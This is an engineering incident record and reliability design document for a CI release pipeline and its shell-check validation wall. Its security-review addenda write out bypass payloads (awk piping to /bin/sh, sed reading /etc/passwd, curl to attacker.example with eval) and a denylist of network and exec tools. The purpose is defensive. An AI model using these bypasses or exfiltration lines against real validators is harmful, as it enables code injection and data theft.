# Pipeline Reliability: Incident 2026-06-25 and the Self-Monitoring Layer

This document records the June 2026 silent release-pipeline failure, explains why the
self-monitoring loops did not catch it, and specifies the reliability layer added in
response: a workflow lint gate, an out-of-band watchdog with auto-heal, and
landing-page stat reconciliation. It complements `docs/threat-intel-pipeline-design.md`
(the seven-loop catalog architecture); the watchdog described here is the loop that
watches the loops.

## Incident summary

Commit `bb682fae` ("security: move GHA expression interpolations out of run blocks
into env") added an `env:` block at the top of the "Download bottles and update
formula" step in `.github/workflows/release.yml`. That step already carried an `env:`
block at its bottom, roughly sixty lines away past a heredoc'd Python script. Local
YAML tooling (PyYAML, most editors) silently tolerates duplicate mapping keys, so
nothing flagged it. GitHub's workflow parser rejects duplicate keys, and a workflow
file that fails to parse produces a `startup_failure` run — zero jobs, zero steps,
zero seconds — on every push event, regardless of the file's trigger filters.

From that commit forward every push to master logged a failed `release.yml` run, and
the manually pushed `v1.8.1` tag on June 25 produced no release. The Homebrew tap and
the curl installer continued serving v1.8.0. Nobody noticed for seventeen days.

A second latent failure was waiting behind the first: the bottle build matrix pinned
`macos-13`, a runner image GitHub has retired, so the Intel bottle job would have
failed even after the parse error was fixed.

## Why no alert fired

Every alerting path in the pipeline was in-band — it lived inside workflow runs.
`tools/notify_promotion.py` sends mail from within an orchestrate run; job failures
surface only if the job actually starts. A workflow that dies at parse time executes
nothing, so it cannot report its own death. GitHub's own failure e-mails are unreliable
here too: most pipeline pushes are made by `preston-check-bot` or the Actions token,
and notifications for bot-triggered runs do not reach a human inbox.

The structural lesson: liveness monitoring cannot live inside the thing being
monitored. It must observe run outcomes from outside, through the API, on a schedule
that does not depend on any other workflow being healthy.

## The reliability layer

Three additions, each independent of the others.

### 1. Workflow lint gate (prevention)

`.github/workflows/workflow-lint.yml` runs `actionlint` on every push and pull request
that touches `.github/workflows/**`. actionlint catches exactly the two classes that
caused or would have prolonged this incident: duplicate-key parse errors
(`syntax-check`) and unknown runner labels (`runner-label`). shellcheck `info` and
`style` findings are ignored so the gate stays signal-only; errors and warnings fail
the build. A broken workflow file can still be force-pushed, but it can no longer land
silently — the lint run goes red on the same push.

### 2. Pipeline watchdog (detection, alerting, auto-heal)

`.github/workflows/pipeline-watchdog.yml` runs `tools/watchdog.py` every six hours and
on manual dispatch. It is deliberately minimal — plain Python, stdlib only, GitHub REST
API via the workflow token — so that its own failure surface stays small. Duties, in
order:

Detect. List all workflow runs completed in the lookback window (25 hours, overlapping
so nothing falls between cron ticks) whose conclusion is `failure`, `startup_failure`,
or `timed_out`. `startup_failure` is called out separately in the report because it
means a workflow file is unparseable and every alerting path inside that file is dead.

Auto-heal, transient class. Runs that concluded `failure` on their first attempt are
re-run once via the re-run API. Genuine flakes (runner weather, network, rate limits)
heal without a human; persistent failures show up again on the next tick as
second-attempt failures and are escalated in the report instead of re-run again.

Auto-heal, release reconciliation. The newest `v*` tag is compared against GitHub
releases. A tag with no release means the release pipeline died after tagging — the
exact v1.8.1 failure mode. The watchdog dispatches `release.yml` with the tag as input,
unless a release run for that tag is already queued or in progress, or three or more
release runs for it have already failed (at that point re-dispatching is a loop, not a
heal, and the report escalates instead).

Auto-heal, landing-page stats. The watchdog runs `tools/update_landing_stats.py`
(section 3). If the landing page drifted, it commits the fix as `preston-check-bot` and
dispatches `pages.yml` explicitly — pushes made with the Actions token do not trigger
`on: push` workflows, so the dispatch is load-bearing, not belt-and-braces.

Alert. When anything was detected, healed, or escalated, the watchdog e-mails a report
through the same SES path as promotion notifications (`send_email` in
`tools/notify_promotion.py`, secrets `PRESTON_NOTIFY_EMAIL` / `SES_AWS_*`). Quiet
windows send nothing. The report separates "auto-healed, no action needed" from "needs
a human", so the inbox signal stays meaningful.

Residual risk, acknowledged: the watchdog cannot watch itself. Its failure modes are
mitigated rather than eliminated — the lint gate covers its workflow file, its Python
is dependency-free, and a scheduled-run failure lands in the actor's GitHub
notifications. If it ever goes quiet for more than a day while other automation is
active, run `notify-self-test.yml` and dispatch it manually.

### 3. Landing-page stat reconciliation (accuracy)

The public headline at preston-check.com carried a hardcoded check count (294) that
predated every threat-intel promotion. `tools/update_landing_stats.py` computes the
real catalog size the same way the runner discovers checks — `checks/*.sh` plus
`checks/community/verified/*.sh` plus `checks/community/accepted/*.sh` (the shipped
set; `proposed/` is excluded exactly as the runner excludes it by default) plus the
deep smart-contract module (`modules/smart-contract-audit/checks/*.sh`) — and rewrites
every count occurrence in `web/landing/index.html`: meta description, OpenGraph
description, hero lede, catalog card with its per-tier breakdown, pricing bullet, and
the stats strip. Idempotent; exits 0 unchanged when the page is already accurate.

It runs in two places: once at promotion-merge time is unnecessary because the
watchdog reconciles within six hours of any promotion landing, and immediately —
today's run — to correct the stale 294. Because the repo copy of `index.html` is
rewritten (rather than substituting at deploy time), the file in git always matches
what is live, and an ordinary human push touching `web/landing/**` still triggers the
normal deploy path.

## release.yml repairs

Four changes, all in the same commit as this document. The duplicate `env:` blocks of
the formula-update step are merged into one. The retired `macos-13` matrix entry
becomes `macos-15-intel` with bottle tag `sequoia`, and the formula writer's canonical
tag order follows. The tarball build now stamps the tag version into `PRESTON_VERSION`
in `preston-check.sh` before archiving, so an auto-tagged release self-reports
correctly even though nothing edits the version line on master. And the workflow gains
a `workflow_dispatch` trigger taking an existing tag, which is what the watchdog uses
to re-release a tag whose original run died; on dispatch, checkout pins to that tag so
the artifact is built from the tagged tree, not master.

One ordering bug is also fixed: bottles used to be built by installing from the tap
formula before the formula was updated, so every release's bottles would have packaged
the previous release's tarball. The formula's url/sha/version are now pushed to the
tap first (`update-tap-url` job), bottles build from the updated formula, and the
bottle SHA block is appended after. If `HOMEBREW_TAP_TOKEN` is not configured both tap
jobs skip gracefully, as before.

## Addendum 2026-07-13: the missing merge leg

A second silent stall was found the day after the release incident, while
verifying that promoted checks had shipped. `tools/orchestrate.py` gates
candidates and delegates the merge to "the workflow"; the orchestrate workflow
labeled each promotion PR `auto-merge`, mailed a notification — and merged
nothing. No workflow anywhere contained a merge step. The six PRs merged in
May were merged by hand (the operator's second account); when the manual
merging stopped on 2026-05-22, the catalog froze at 320 checks while
orchestrate opened a new PR every cycle. Four hundred twenty promotion PRs
accumulated, every run green, no alert — a liveness gap invisible to
run-outcome monitoring.

Three changes close it. The orchestrate workflow now squash-merges its own
promotion PR immediately after opening it (the verification wall has already
gated the candidates; the PR is an audit trail, not a review request), then
explicitly dispatches `auto-tag-release.yml`, because pushes made with the
Actions token never fire `on: push` workflows. `auto-tag-release.yml` gained
the `workflow_dispatch` trigger and a concurrency group accordingly. And the
watchdog now escalates any promotion PR open for more than 24 hours — the
signal that this leg has broken again.

The 420-PR backlog was resolved by merging only the newest PR and closing the
rest: per-run file numbering (`738-…`, `739-…`) is assigned against the
current `accepted/` tree, so the same CVE carries different filenames across
stale PRs and bulk-merging them would collide. Closed candidates are not
lost — the synthesis dedup only skips CVEs already present in `accepted/`,
so anything still unpromoted re-proposes in later cycles and now merges
automatically. For the same collision reason, the watchdog deliberately does
NOT auto-merge stale promotion PRs; it escalates them to a human.

## Addendum 2026-07-13: full security review (wall bypasses, liveness, hardening)

A five-agent adversarial review plus hands-on exploitation found that the
verification wall — the one control between untrusted internet feeds and shell
code shipped to users — had multiple confirmed, reproduced bypasses. Because
the downstream gates (TPR/FPR validation, adversarial loop) are author-
controlled for a deliberately crafted candidate, the wall was effectively the
sole real gate, and it leaked. Auto-publish was paused via the kill switch
(`PRESTON_AUTOMERGE_ENABLED=false`) for the duration of the patch and restored
after verification.

### Wall bypasses found and closed

Root cause: bashlex cannot parse `[[ -z ... ]]`, a construct in every generated
check, so 100% of shipped checks were validated by the weaker regex fallback
rather than the sound AST path. The fallback had several blind spots, each
independently exploitable:

Commands after `)` / shell keywords. A `case x in y) curl … ;; esac` — valid
bash the fallback's command-start regex did not recognise — smuggled `curl`,
`eval`, `rm` straight through. Fix: `[[ … ]]` is now normalised so bashlex
parses real checks via the sound AST path, and any source bashlex still cannot
parse (case/esac, coproc, line continuations) is REJECTED (fail closed) rather
than passed to a weaker scan.

awk/sed/cat/cut program-text escapes. `awk 'BEGIN{print "x" | "/bin/sh"}'`,
`awk '{print > "/tmp/x"}'`, `sed '1e id'`, `sed 'w /tmp/x'`, `sed 'r /etc/passwd'`,
and `cat /any/path` all passed — the AST walker never inspects a command's
program-text argument. Zero shipped checks used any of these commands, so they
were removed from the allowlist entirely (grep/rg/find cover static detection).
The awk/sed program-text denylist patterns were also extended (output pipe,
output redirection, sed e/w/r) as defence in depth.

Command substitutions hidden in double quotes. The fallback blanked the
interior of `"$(…)"`, so `x="$(wget evil)"` hid the denied command. Fix: every
`$(…)` interior is now extracted and validated as its own command context —
which also works around bashlex's inability to parse `||`/`&&` inside `$(…)`.

A pre-existing false positive was fixed in the same pass: the ANSI-C-quoting
pattern flagged the ubiquitous `grep -v '^$'` blank-line idiom (the `$'` there
is a regex anchor plus a closing quote, not an ANSI-C opener).

After the fixes: all 37 shipped checks validate via the sound AST path, the
red-team harness reports catch rate 1.0 and legitimate pass rate 1.0 across 488
attack variants, and the specific bypasses above are encoded as permanent
regression fixtures in `tools/sandbox_redteam.py`.

### Liveness gaps closed

The watchdog swallowed SES send failures and exited 0 — a blind alert channel
looked healthy. It now turns the run red when it cannot deliver an alert or
when unresolved escalations remain. The auto-tag retry loop exited 0 when every
attempt lost the tag-push race (no tag, no release, and nothing for the
watchdog to notice); it now fails loudly. The orchestrate merge step now fails
after retries instead of only warning. The ingest loop keeps its graceful
per-source degradation but now fails when every source fails in one cycle.

### Workflow hardening

`lint-community.yml` no longer interpolates a PR-controlled filename list into
a shell script (a path with quotes or `$(…)` was an injection vector); it flows
through `env`. `workflow-lint.yml`'s actionlint bootstrap is pinned to an
immutable release tag instead of `curl | bash` from `main`. `setup-homebrew`
is pinned to a commit SHA instead of `@master`. `test.yml` gained an explicit
read-only `permissions` block.

### End-user runtime

Auto-generated checks now run under a scrubbed environment (`env -i` with only
PATH, HOME, LANG, SOURCE_DIR) so a check cannot read the user's cloud
credentials or tokens even into local output — additional to the wall already
blocking network and file writes. Verified against the 60-test behavioral
harness and a real accepted check.

### Residual items for owner decision (not unilaterally changed)

These are product-threat-model or policy calls rather than clear bugs, so they
are surfaced rather than silently changed:

Untrusted-source auto-merge. RESOLVED 2026-07-13 (source-corroboration policy,
implemented in `tools/orchestrate.py`). Reddit / Mastodon / mailing-list
content is attacker-influenceable free text; the wall stops malicious code, but
a crafted input could still steer synthesis toward a semantically misleading
check (a false-PASS hiding a real vulnerability class) that a shell-safety gate
cannot catch. Now: a candidate is auto-merged and SHIPPED
(`checks/community/accepted/`, version + release) only when at least one of its
sources is a reactive authoritative feed (KEV/GHSA/NVD/OSV). Candidates
synthesised only from proactive text are routed to the unverified tier
(`checks/community/proposed/`): committed and attested as an audit trail,
available to users who opt in with `--include-proposed`, and displayed with an
`[UNVERIFIED]` label so an uncorroborated early warning is never mistaken for a
framework-corroborated result. An unverified-only cycle merges for the audit
trail but cuts no version release. This preserves the early-warning value of
social/mailing-list signals without shipping them as verified.

Structural prompt isolation. `synthesize.py` places candidate data in the LLM
user message with prompt-based (not tool-argument) isolation. The wall is the
primary control; moving candidate data into structured tool parameters would
harden against prompt injection as defence in depth.

CI candidate execution. `validate_candidate.py` / `adversarial_loop.py` execute
the candidate on the same runner that holds the attestation signing key in
`/tmp`. With the wall sound (no network, no arbitrary file write) exfiltration
is blocked, but running candidate execution under the same `env -i` scrub and
isolating the signing key would remove the residual.

Auxiliary-loop push suppression. `drift-detection`, `rss-feed-discovery`, and
`telemetry-aggregate` use `|| true` on their `git push`, so a lost report is
silent. These are non-shipping maintenance loops; hardening them is lower
priority than the ship path but noted for completeness.

## Addendum 2026-07-29: the watchdog's echo loop

The 2026-07-13 liveness hardening ("turns the run red … when unresolved escalations
remain") interacted with the watchdog's habit of reporting its own failed runs to
produce a permanent failure loop. On 2026-07-17 two Release runs failed; the watchdog
escalated them — correctly — and, per the hardening, exited non-zero, turning its own
run red. Every subsequent run then found that red watchdog run inside its 25-hour
lookback, escalated "watchdog's own run failed", and exited non-zero in turn. The
underlying Release failures aged out of the window within a day; the self-escalation
never could, because each cycle manufactured the next cycle's evidence. The
"superseded by a newer green run" guard cannot break the loop either — it needs a
newer successful watchdog run, which the loop precludes. Fifty consecutive red runs
and twelve days of four-a-day failure e-mails followed, all echo, no signal.

The fix removes self-observation from the failed-run scan entirely: runs named
"Pipeline watchdog" are skipped, not escalated. This loses nothing. A deliberately red
self-run is an echo by construction — whatever caused it either still exists (this
cycle re-detects it fresh from the API) or has resolved (nothing left to report). A
crashed self-run is either transient (the current run being alive is the recovery) or
persistent (the current run crashes too and could never have reported anyway).
Coverage for the crash case was never the self-scan: it is the actor's GitHub
notifications, as the residual-risk note above already records — the failure e-mails
that surfaced this very incident. The deliberate red-on-escalation exit stays; it is
correct for everything that is not the watchdog itself.

## Addendum 2026-08-31: the promotion PR's phantom checks

From 2026-08-29 every scheduled watchdog run went red, reporting the same three runs as
needing attention: `Tests`, `Lint community checks`, and `Preston-Check Security Audit`,
each concluded `failure` on a `threat-intel/automerge-*` branch. None of them had
tested anything. Each had zero jobs, zero logs, and GitHub's generic "this run likely
failed because of a workflow file issue" banner — the same signature as the June parse
error, but with workflow files that were perfectly valid.

The cause was a race inside `threat-intel-orchestrate.yml`. The job opened its
promotion PR and then squash-merged it with `--delete-branch` in the following step, a
gap of roughly four seconds. For PR #859 the PR opened at 21:58:49, Actions dispatched
the three `pull_request` workflows at 21:58:52, and the merge deleted the head branch
at 21:58:53. The runs never finished resolving their merge ref before it was removed,
so they died before creating a single job. Re-running one of them unchanged, days
later, passes: the content and the workflow files were always fine.

The watchdog could not heal them, for a reason worth recording. `rerun_failed()` called
`/actions/runs/{id}/rerun-failed-jobs`, which re-runs the *failed jobs* of a run. A run
that died before creating any jobs has no failed jobs to re-run, and the endpoint
answers `403 This workflow run cannot be retried`. The full `/actions/runs/{id}/rerun`
endpoint accepts the same run without complaint. The watchdog was therefore blind in
precisely the class it exists to catch — the run that executes zero steps — and every
six hours it found three unhealable failures, escalated them, and exited red. Note too
that GitHub reports this class as plain `failure`, not `startup_failure`, so the
watchdog's dedicated unparseable-workflow branch never saw them either.

Filtering these runs away at the workflow level is not possible, which is worth stating
because it is the obvious first instinct. For `pull_request` events the `branches` and
`branches-ignore` filters match the *base* branch, and every promotion PR targets
`master`; a job-level `if:` on `github.head_ref` fails for a different reason, since the
run dies before the workflow file is ever expanded into jobs. There is no head-branch
filter for `pull_request`. The race had to be fixed at its source.

`threat-intel-orchestrate.yml` now waits for the PR's checks to complete before
merging. This removes the race, and for the first time makes those checks a real gate
rather than a decorative one — until now they had never once run to completion on a
promotion PR. When a check fails the merge step is skipped and the PR stays open, where
the existing stuck-promotion escalation picks it up after a day, which is the behaviour
that check was already written to provide.

A second gap surfaced while tracing the first. Because a merge made with the Actions
token does not fire `on: push` workflows, nothing validated the merged result on master
either — the promotion landed entirely ungated by `shellcheck`. Generated checks were
never unsafe, since `sandbox_validate.py`'s bashlex AST wall runs fail-closed before
promotion, but they were unlinted. The orchestrate job now runs `shellcheck -S warning`
and `tools/lint-check.sh` against the files it just generated, before the commit is
made. Both are needed: `lint-check.sh` records a shellcheck failure as a warning and
still exits zero, so it enforces metadata and forbidden-pattern rules but not shell
correctness.

Wiring `lint-check.sh` into that gate exposed a third defect, and a more serious one.
Its forbidden-construct check — the ban on `curl`, `wget`, `nc`, `eval`, `exec`,
`/dev/tcp` and friends — filtered the file with an awk expression whose flag toggled
only on the closing `PRESTON_META` delimiter, never on the opening
`: <<'PRESTON_META'`. It therefore scanned the metadata block and skipped the script
body, inverting the gate in both directions at once: ten of 738 checks were rejected
for prose such as "ussync parameters", while a check whose body called
`curl http://attacker.example/exfil` and `eval "$SRC"` passed with "no forbidden
patterns". Both directions were demonstrated directly rather than inferred.

The exposure was narrower than it first appears, but real. Auto-generated checks were
never at risk: `orchestrate.py` gates every synthesized candidate through
`sandbox_validate.py` independently of the linter. Human-contributed checks were. No
workflow invokes `sandbox_validate` — it runs only inside `orchestrate.py` — so for a
check arriving by pull request, `lint-check.sh`'s pattern list was the only automated
security gate, and it was reading the wrong half of the file.

The regex list is now deleted and the gate delegates to `sandbox_validate.py`, which
parses the script with bashlex and fails closed. This removes a weaker second
implementation of a job the pipeline already does soundly: the probe that slipped past
the old gate is rejected via the AST path, and all ten prose false positives clear.
`lint-community.yml` installs bashlex so the sound path runs rather than the
command-start fallback. Had the regex list been left in place, the new orchestrate lint
gate would have inherited those ten false positives and stalled promotions outright.

Routing hand-written checks through the wall for the first time surfaced a fourth
defect, in the wall itself. bashlex has no arithmetic-command node: it parses
`((count += 1))` as a pair of nested subshells wrapping a command whose first word is
the variable name, so `_walk_for_commands` reported `command not on allowlist: count`
for ordinary arithmetic. Synthesized checks never use the construct, which kept the
false positive latent; `checks/community/proposed/201-graphql-introspection.sh` uses it
twice and was rejected outright. `_normalize_arithmetic` now rewrites `(( ... ))` to the
same `:` no-op that `[[ ]]` normalisation already relies on, scanning for balanced
parens because a non-greedy regex truncates nested forms, and leaving `$(( ... ))`
expansion untouched. The rewrite cannot smuggle anything past the wall: an arithmetic
context cannot invoke a command, and any `$(...)` inside has already been lifted out by
`_extract_command_subs` and validated as its own context, so `((count += $(curl ...)))`
is still rejected — there is a test asserting exactly that. With the misparse fixed, 201
needed only its backslash-newline continuations joined to satisfy the anti-obfuscation
rule.

Making the wall the single bar for both paths is the point. Human-contributed and
synthesized checks now clear the same sound AST gate, rather than the contribution path
relying on a regex list that was the only thing between a submitted check and `curl`.

One unrelated observation recorded while verifying that reformat, and deliberately not
fixed here: 201's own `grep -v "test\|spec\|..."` filter discards every line it just
matched, because the string "introspection" contains "spec". The check cannot report a
TypeScript finding. It is unshipped, sits in `proposed/`, and behaves identically before
and after the reformat, so it is left for a deliberate fix.

Finally, `rerun_failed()` falls back to the full re-run endpoint when
`rerun-failed-jobs` refuses. That restores auto-heal for zero-job runs generally, not
only for this one cause.

## Verification record (2026-07-12)

actionlint clean across all workflow files after the fixes. Watchdog dry-run executed
locally against the live API before first scheduled run. v1.8.1 release healed by the
first watchdog dispatch; landing page count corrected and redeployed. Details in the
commit that introduced this file and in CHANGELOG.md.

## Addendum 2026-09-06 — one broken bottle leg silently unbottled every platform

Homebrew dropped macOS Intel x86_64 support (announced August 2025, effective
September 2026). The `pcre2` dependency stopped publishing an Intel bottle, so the
`bottle (macos-15-intel, sequoia)` leg began failing on every release with "the
following formula cannot be installed from bottle and must be built from source".
That much was visible: fifteen red Release runs between 2026-09-01 and 2026-09-06.

What was not visible is that the failure was never confined to Intel. `update-tap`
declared `needs: [release, bottle]`, and a matrix job concludes `failure` when any
leg fails — `fail-fast: false` lets the sibling legs finish but does not change the
job's aggregate result, and `needs` reads the aggregate. So `update-tap` was skipped
on every release. By then `update-tap-url` had already stripped the `bottle do` block
from the tap formula, deliberately, on the assumption that `update-tap` would write
fresh SHAs back a few minutes later. With that job skipped, the assumption never
held: the formula shipped with no bottle block at all, and `brew install
preston-check` built from source on all four platforms whose bottles had in fact
built successfully and been uploaded to the release. Verified identical across the
seven releases from 2026-09-04 to 2026-09-06 — one failed leg, `update-tap` skipped,
every time.

The lesson is that stripping state early is only safe if the step that restores it
cannot be skipped. The strip was guarded by nothing; the restore was guarded by the
success of five independent platform builds.

Three changes. The Intel leg is removed from the matrix rather than left to fail,
because no configuration of it can succeed while its dependencies ship no Intel
bottle; Apple dropped Intel in macOS 27 and GitHub retires Intel runners in 2027, so
Intel users now take the documented source-build path. `update-tap` now runs under
`if: !cancelled() && needs.release.result == 'success'`, publishing whichever bottles
did build, so a single broken platform degrades that platform alone — it still waits
on `bottle` via `needs`, it simply no longer requires every leg to have passed. And
the zero-bottle case, which is the state that went unnoticed here, now emits a
`::error::` annotation naming the consequence instead of printing "0 bottle(s)" and
moving on.

## Verification record (2026-09-06)

actionlint clean on release.yml. The embedded `update-tap` formula-rewriting script
was extracted and exercised against a fixture tap in three cases: three of four
bottles present, which produced a well-formed three-entry `bottle do` block inserted
after the version line; zero bottles present, which produced the `::error::`
annotation and no block; and a rewrite over an already-present block, which left
exactly one `bottle do` block, confirming the pre-existing replace path was not
disturbed. End-to-end confirmation requires the next release to show `update-tap`
concluding `success` and the tap formula carrying four bottle SHAs.
